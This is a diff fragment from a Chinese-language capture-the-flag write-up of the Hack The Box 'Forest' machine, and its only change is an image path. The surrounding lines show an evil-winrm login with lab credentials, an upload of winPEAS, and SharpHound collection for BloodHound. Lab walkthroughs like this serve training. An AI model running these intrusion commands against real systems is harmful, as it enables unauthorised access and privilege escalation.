@@ -111,7 +111,7 @@ evil-winrm -i htb.local -u svc-alfresco -p 's3rvice'
 upload /root/Documents/HTB-AD/forest/tools/winPEASx64.exe
 ```
 
-<figure><img src="../../.gitbook/assets/19 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/19 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 上传sharphound进行信息收集，放入bloodhound中分析各个用户、组成员等之间的关系：
 
